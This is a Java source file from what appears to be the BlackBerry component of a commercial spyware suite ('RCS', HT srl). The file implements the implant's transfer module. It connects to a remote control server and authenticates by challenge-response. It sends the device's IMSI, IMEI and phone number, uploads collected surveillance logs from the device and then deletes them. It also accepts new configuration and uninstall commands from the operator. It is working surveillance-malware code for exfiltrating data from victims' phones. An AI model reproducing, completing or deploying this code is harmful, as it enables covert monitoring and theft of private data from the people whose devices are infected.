/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Transfer.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.util.Random;
import java.util.Vector;

import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.Conf;
import com.ht.rcs.blackberry.Device;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

    /** The debug. */
    protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);

    /** The Constant instance_. */
    private static Transfer instance = new Transfer();

    /**
     * Gets the single instance of Transfer.
     * 
     * @return single instance of Transfer
     */
    public static Transfer getInstance() {
        return instance;
    }

    private LogCollector logCollector;

    private Encryption crypto;
    private String host = "";

    private int port = 0;
    private boolean ssl;
    
    private boolean wifiPreferred;
    private boolean wifi = false;

    private boolean connected = false;

    private boolean uninstall = false;

    private Connection connection = null;

    byte[] challenge = new byte[16];
    
    Keys keys;

    /**
     * Instantiates a new transfer.
     */
    protected Transfer() {
        logCollector = LogCollector.getInstance();
        keys = Keys.getInstance();
        crypto = new Encryption();
    }

    protected boolean connect() {
        if (connected) {
            debug.error("Already connected");
            Check.asserts(connection != null, "connection null");
            return true;
        }

        wifi = false;
        if (wifiPreferred) {
            debug.trace("Try wifi");
            connection = new WifiConnection(host, port, ssl);
            if (connection.isActive()) {
                wifi = true;
                connected = connection.connect();
            }
        }

        // fall back
        if (!wifi || !connected) {
            debug.trace("Try direct tcp");
            connection = new DirectTcpConnection(host, port, ssl);
            connected = connection.connect();
        }

        if (connection == null) {
            debug.error("null connection");
            return false;
        }

        debug.info("connected: " + connected);
        return connected;

    }

    protected void disconnect() {
        if (connected) {
            connected = false;
            sendCommand(Proto.BYE);
            connection.disconnect();
            connection = null;
        }
    }

    /**
     * Riceve un intero dalla rete che rappresenta la misura del payload per il
     * comando.
     * 
     * @param command
     * @throws ProtocolException
     */
    protected void fillPayload(Command command) throws ProtocolException {
        Check.ensures(command != null, "command null");

        try {
            byte[] buflen = connection.receive(4);
            int len = Utils.byteArrayToInt(buflen, 0);

            sendCommand(Proto.OK);

            fillPayload(command, len);
        } catch (IOException e) {
            debug.error("receiving command: " + e);
            throw new ProtocolException("fillPayload");
        }

    }

    /**
     * Riceve dati per la lunghezza specificata dalla connessione e li usa per
     * riempire il payload del command.
     * 
     * @param command
     * @param len
     * @throws ProtocolException
     */
    protected void fillPayload(Command command, int len)
            throws ProtocolException {
        Check.ensures(command != null, "command null");
        Check.ensures(len > 0 && len < 65536, "wrong len: " + len);

        try {
            command.payload = connection.receive(len);
            debug.trace("filled with: " + command.payload.length);
        } catch (IOException e) {
            debug.error("receiving command: " + e);
            throw new ProtocolException("fillPayload");
        }
    }

    protected void getChallenge() throws ProtocolException {

        debug.info("getChallenge");

        Command command = recvCommand();

        if (command == null || command.id != Proto.CHALLENGE) {
            throw new ProtocolException("=wrong proto.challange");
        }

        // e' arrivato il challange, leggo il contenuto
        if (command != null && command.id == Proto.CHALLENGE) {
            fillPayload(command, 16);

            if (command.size() != 16) {
                debug.error("getChallenge: expecting 16 bytes");
                throw new ProtocolException("getChallenge: expecting 16 bytes");
            }
            // ho 16 byte di challange, li cifro e li salvo
            challenge = crypto.encryptData(command.payload);

        } else {
            throw new ProtocolException("not a valid challenge command");
        }
    }

    protected void getNewConf(Command command) throws CommandException,
            ProtocolException {

        debug.trace("getNewConf");

        fillPayload(command);
        if (command.size() > 0) {
            AutoFlashFile file = new AutoFlashFile(Path.USER_PATH
                    + Path.CONF_DIR + Conf.NEW_CONF, true);
            if (file.exists()) {
                file.delete();
            }
            file.create();
            boolean ret = file.write(command.payload);
            if (!ret) {
                throw new CommandException("Cannot write new conf");
            } else {
                sendCommand(Proto.OK);
            }
        }
    }

    protected void getResponse() throws ProtocolException {
        debug.info("getResponse");

        Command command = recvCommand();
        // boolean exception = false;
        if (command == null || command.id != Proto.RESPONSE) {
            throw new ProtocolException("=wrong proto.response");
        }

        // e' arrivato il response, leggo il contenuto
        if (command != null && command.id == Proto.RESPONSE) {
            fillPayload(command, 16);
            if (command.size() != 16) {
                throw new ProtocolException("getResponse: expecting 16 bytes");
            }
            // ho 16 byte di response, lo confronto con il challange crittato
            byte[] cryptoChallenge = crypto.encryptData(challenge);
            if (!Arrays.equals(cryptoChallenge, command.payload)) {
                throw new ProtocolException(
                        "getResponse: challange does not match");
            } else {
                debug.info("Response OK");
                sendCommand(Proto.OK);
            }

        } else {
            throw new ProtocolException("not a valid response command");
        }

    }

    protected void getUpgrade(Command command) throws CommandException {
        throw new CommandException("Not Implemented");
    }

    protected void getUpload(Command command) throws CommandException {
        throw new CommandException("Not Implemented");
    }

    public void init(String host_, int port_, boolean ssl_, boolean wifiPreferred_) {
        this.host = host_;
        this.port = port_;
        this.ssl = ssl_;
        this.wifiPreferred = wifiPreferred_;
        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    protected boolean parseCommand(Command command) throws ProtocolException {
        Check.asserts(command != null, "null command");

        try {

            switch (command.id) {
            case Proto.SYNC:
                debug.info("SYNC");
                syncLogs(command);
                break;

            case Proto.NEW_CONF:
                debug.info("NEW_CONF");
                getNewConf(command);
                break;

            case Proto.UNINSTALL:
                debug.info("UNINSTALL");
                uninstall = true;
                sendCommand(Proto.OK);
                return false;

            case Proto.DOWNLOAD:
                debug.info("DOWNLOAD");
                sendDownload(command);
                break;

            case Proto.UPLOAD:
                debug.info("UPLOAD");
                getUpload(command);
                break;

            case Proto.UPGRADE:
                debug.info("UPGRADE");
                getUpgrade(command);
                break;

            case Proto.BYE:
                debug.info("BYE");
                return false;

            default:
                break;
            }
        } catch (CommandException ex) {
            debug.warn("parseCommand exception:" + ex);
            sendCommand(Proto.NO);
        }

        return true;
    }

    protected Command recvCommand() {
        debug.trace("recvCommand");

        Command command = null;
        byte[] commandId;
        try {
            commandId = connection.receive(4);
            int id = Utils.byteArrayToInt(commandId, 0);
            if (id != 0) {
                command = new Command(id, null);
            }
        } catch (IOException e) {
            debug.error("receiving command: " + e);
        }

        debug.trace("received: " + command);
        return command;
    }

    public synchronized boolean send() {
        if (!connect()) {
            debug.error("not connected");
            return false;
        }

        try {
            // challenge response
            debug.trace("ChallengeResponse ->");
            sendChallenge();
            getResponse();

            debug.trace("ChallengeResponse <-");
            getChallenge();
            sendResponse();

            // identificazione
            debug.trace("Ids");
            sendIds();

            // ricezione configurazione o comandi
            for (;;) {
                Command command = recvCommand();
                debug.info("Received command:" + command);
                if (!parseCommand(command)) {
                    debug.info("finished commands");
                    break;
                }
            }

        } catch (ProtocolException ex) {
            debug.error("protocol exception");
            return false;
        } finally {
            disconnect();
        }

        debug.info("done");
        return true;
    }

    protected void sendChallenge() throws ProtocolException {

        debug.info("sendChallenge");

        // TODO: keep a log seed
        Random random = new Random();

        for (int i = 0; i < 16; i++) {
            challenge[i] = (byte) random.nextInt();
        }

        if (!sendCommand(Proto.CHALLENGE, challenge)) {
            throw new ProtocolException("sendChallenge: cannot send");
        }
    }

    protected boolean sendCommand(Command command) {

        Check.requires(command != null, "null command");
        debug.trace("sending command: " + command);

        byte[] data = new byte[command.size() + 4];
        DataBuffer databuffer = new DataBuffer(data, 0, data.length, false);

        databuffer.writeInt(command.id);
        if (command.payload != null) {

            databuffer.write(command.payload);
        } else {
            debug.trace("payload null");
        }

        Check.ensures(command.size() + 4 == data.length, "wrong length");

        try {
            return connection.send(data);
        } catch (IOException e) {
            return false;
        }
    }

    protected boolean sendCommand(int command) {
        return sendCommand(new Command(command, null));
    }

    protected boolean sendCommand(int command, byte[] payload) {
        return sendCommand(new Command(command, payload));
    }

    protected void sendManagedCommand(int commandId, byte[] plain,
            boolean cypher) throws ProtocolException {

        byte[] toSend;

        if (cypher) {
            debug.info("Sending Crypto Command: " + commandId);
            toSend = crypto.encryptData(plain);
        } else {
            debug.info("Sending Managed Command: " + commandId);
            toSend = plain;
        }

        sendCommand(commandId, Utils.intToByteArray(plain.length));
        waitForOK();

        boolean sent = false;
        try {
            sent = connection.send(toSend);
        } catch (IOException e) {
            debug.error(e.toString());
        }

        if (!sent) {
            throw new ProtocolException("sendManagedCommand cannot send"
                    + commandId);
        }

        waitForOK();

    }

    protected void sendCryptoCommand(int commandId, byte[] plain)
            throws ProtocolException {

        sendManagedCommand(commandId, plain, true);

    }

    protected void sendDownload(Command command) throws CommandException {
        throw new CommandException("Not Implemented");
    }

    protected void sendIds() throws ProtocolException {

        Device device = Device.getInstance();
        device.refreshData();

        sendCryptoCommand(Proto.VERSION, Device.getVersion()); // 4
        sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype()); // 2
        sendCryptoCommand(Proto.ID, Keys.getInstance().getBuildId()); // 16
        sendCryptoCommand(Proto.INSTANCE, Keys.getInstance().getInstanceId()); // 20

        sendCryptoCommand(Proto.USERID, device.getWImsi());
        sendCryptoCommand(Proto.DEVICEID, device.getWImei());
        sendCryptoCommand(Proto.SOURCEID, device.getWPhoneNumber());

    }

    protected void sendResponse() throws ProtocolException {
        Check.requires(challenge != null, "null crypto challange");

        debug.info("sendResponse");

        // challange contiene il challange cifrato, pronto per spedizione
        if (!sendCommand(Proto.RESPONSE, challenge)) {
            throw new ProtocolException("sendResponse: cannot send response");
        }

        waitForOK();
    }

    protected synchronized void syncLogs(Command command)
            throws ProtocolException {

        debug.info("syncLogs connected: " + connected + " wifi: " + wifi);

        sendLogs(Path.SD_PATH);
        sendLogs(Path.USER_PATH);

        sendCommand(Proto.LOG_END);
        waitForOK();
    }

    private void sendLogs(String basePath) throws ProtocolException {
        debug.info("sending logs from: " + basePath);

        Vector dirs = logCollector.scanForDirLogs(basePath);
        for (int i = 0; i < dirs.size(); i++) {
            String dir = (String) dirs.elementAt(i);
            Vector logs = logCollector.scanForLogs(basePath, dir);
            for (int j = 0; j < logs.size(); j++) {
                String logName = (String) logs.elementAt(j);
                String fullLogName = basePath + dir + logName;
                AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                if (!file.exists()) {
                    debug.error("File doesn't exist: " + fullLogName);
                    continue;
                }
                byte[] content = file.read();
                debug.info("Sending file: " + logCollector.decryptName(logName)
                        + " = " + fullLogName);
                sendManagedCommand(Proto.LOG, content, false);
                logCollector.remove(fullLogName);
            }
            if (!Path.removeDirectory(basePath + dir)) {
                debug.warn("Not empty directory");
            }
        }
    }

    private void waitForOK() throws ProtocolException {
        Command ok = recvCommand();
        if (ok == null || ok.id != Proto.OK) {
            throw new ProtocolException("sendCryptoCommand error");
        }
    }
}
